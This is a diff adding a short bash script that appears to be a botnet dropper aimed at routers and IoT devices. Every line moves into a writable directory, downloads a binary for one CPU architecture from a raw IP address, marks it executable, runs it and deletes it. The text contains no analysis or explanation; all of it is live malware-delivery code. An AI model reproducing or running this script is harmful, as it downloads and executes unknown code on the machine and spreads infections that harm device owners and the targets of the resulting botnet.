@@ -1,0 +1,14 @@
+-e #!/bin/bash
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.178.19.122/mips; chmod +x mips; ./mips; rm -rf mips
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.178.19.122/mipsel; chmod +x mipsel; ./mipsel; rm -rf mipsel
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.178.19.122/sh4; chmod +x sh4; ./sh4; rm -rf sh4
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.178.19.122/x86; chmod +x x86; ./x86; rm -rf x86
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.178.19.122/arm61; chmod +x arm61; ./arm61; rm -rf arm61
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.178.19.122/i686; chmod +x i686; ./i686; rm -rf i686
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.178.19.122/ppc; chmod +x ppc; ./ppc; rm -rf ppc
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.178.19.122/586; chmod +x 586; ./586; rm -rf 586
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.178.19.122/m68k; chmod +x m68k; ./m68k; rm -rf m68k
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.178.19.122/dc; chmod +x dc; ./dc; rm -rf dc
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.178.19.122/dss; chmod +x dss; ./dss; rm -rf dss
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.178.19.122/co; chmod +x co; ./co; rm -rf co
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.178.19.122/scar; chmod +x scar; ./scar; rm -rf scar
